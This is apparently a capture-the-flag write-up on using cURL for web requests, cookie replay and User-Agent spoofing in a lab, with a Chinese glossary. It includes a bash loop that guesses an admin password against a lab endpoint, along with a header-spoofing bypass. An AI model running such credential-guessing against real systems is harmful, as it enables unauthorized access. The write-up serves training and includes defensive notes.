# AoC 2025 Day 24 — Exploitation with cURL (Hoperation Eggsploit)

> Scope: authorized lab / CTF only. Treat every request as **“explicit permission required”**.

## Summary

This challenge simulates “browser-less web interaction”: no Burp Suite, no GUI, just a shell. The core skill is using **cURL** (command-line HTTP client) to:

* send **GET/POST** requests,
* inspect **raw responses** (headers + body),
* persist and replay **cookies/sessions**,
* automate repetitive requests (mini brute-force loop),
* spoof **User-Agent** to bypass naive client-side checks.

## Mental model

HTTP is a request/response protocol.

```text
Client (curl)                        Server
    |  GET /post.php ---------------> |
    |  <--- 200 OK + body/headers --- |
    |  POST username=...&password= -->|
    |  <--- 302/200 + Set-Cookie ---- |
    |  GET /cookie.php + Cookie: ... >|
    |  <--- 200 OK + flag ----------- |
```

## Key concepts

### HTTP methods

* **GET**: fetch a resource (usually no state change).
* **POST**: submit data; may create state (login, actions).
* **HEAD**: like GET but headers only (useful to check status/headers quickly).

### Response anatomy

* **Status code**: e.g., `200 OK`, `403 Forbidden`.
* **Headers**: metadata (`Content-Type`, `Set-Cookie`, etc.).
* **Body**: HTML/JSON/text payload.

### Cookies & sessions

* A server often returns `Set-Cookie: PHPSESSID=...` to establish session state.
* Browsers resend cookies automatically; with cURL you must **store** and **replay** them.

## Workflow

### 0) Sanity check

```bash
curl -h
curl -V
```

### 1) Basic GET: read the landing page

```bash
curl http://MACHINE_IP/
```

Interpretation: you’ll see plain text / HTML, not a rendered page.

### 2) POST to a login-like endpoint

Typical HTML form submission is URL-encoded.

```bash
curl -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
```

Useful variants:

```bash
# include headers in output
curl -i -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php

# silent mode (good for scripting)
curl -s -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
```

### 3) Cookie capture + replay (session persistence)

**Step A — save cookie jar**

```bash
curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/cookie.php
```

**Step B — reuse cookies**

```bash
curl -b cookies.txt http://MACHINE_IP/cookie.php
```

Notes:

* `cookies.txt` is a “cookie jar” file; inspect with `cat cookies.txt`.
* If the server sets a session cookie, you should see it in the jar.

### 4) Automate a tiny password trial loop (CTF training)

Create a small wordlist:

```bash
echo -e "admin123\npassword\nletmein\nsecretpass\nsecret" > passwords.txt
```

Script loop (`loop.sh`):

```bash
#!/usr/bin/env bash
set -euo pipefail

for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  resp=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$resp" | grep -qi "welcome"; then
    echo "[+] Password found: $pass"
    exit 0
  fi
done

echo "[-] No password matched"
exit 1
```

Run:

```bash
chmod +x loop.sh
./loop.sh
```

### 5) Spoof User-Agent to bypass naive UA checks

Some apps block default `curl/...` User-Agent.

```bash
curl -A "TBFC" http://MACHINE_IP/agent.php
```

Debug with headers:

```bash
curl -i http://MACHINE_IP/agent.php
curl -i -A "TBFC" http://MACHINE_IP/agent.php
```

## Why these flags matter (cheat sheet)

* `-X POST` / `--request`: choose method explicitly (GET is default).
* `-d` / `--data`: send URL-encoded body (also implies POST if method not set).
* `-i`: include response headers in output (fast visibility).
* `-I`: send HEAD request (headers only).
* `-s`: silent mode (script-friendly).
* `-c`: write received cookies to a file (cookie jar).
* `-b`: send cookies from a file/string.
* `-A`: set User-Agent.

## Pitfalls (common failure modes)

* Missing scheme: `curl MACHINE_IP` ≠ `curl http://MACHINE_IP/`.
* Quoting/escaping: always quote `-d "k=v&k2=v2"` to avoid shell splitting.
* Assuming login success without checking headers/body: verify `Set-Cookie` or success marker.
* Cookie replay to the wrong path/domain: cookies are scoped; use the correct endpoint.
* False positives in brute force: match a stable “success string”, not a generic word.
* Over-automation: add delays and strict scope; in real systems this becomes illegal/abusive.

## Defender’s view (what this teaches)

* Weak passwords + no rate limiting ⇒ trivial credential guessing.
* Session security matters: cookie flags (HttpOnly/Secure/SameSite) reduce abuse surface.
* User-Agent checks are not authentication; treat UA as **untrusted input**.

## Chinese glossary (术语速查)

| Term        | 中文注释                       |
| ----------- | -------------------------- |
| Endpoint    | 端点/接口路径（比如 `/post.php`）    |
| HTTP method | 请求方法（GET/POST/HEAD）        |
| Header      | 请求/响应头（元数据）                |
| Status code | 状态码（200/403/…）             |
| Cookie      | 浏览器/客户端保存的小字符串，用于状态管理      |
| Session     | 会话（服务器端状态 + 客户端 cookie 标识） |
| User-Agent  | 用户代理字符串，用于标识客户端类型（可伪造）     |
| Brute force | 暴力尝试口令（仅限授权环境）             |
| CSRF        | 跨站请求伪造（让已登录用户“被动发请求”）      |

## Further reading

* cURL manpage (options reference)
* MDN: HTTP status codes (200, 403)
* MDN: HTTP cookies
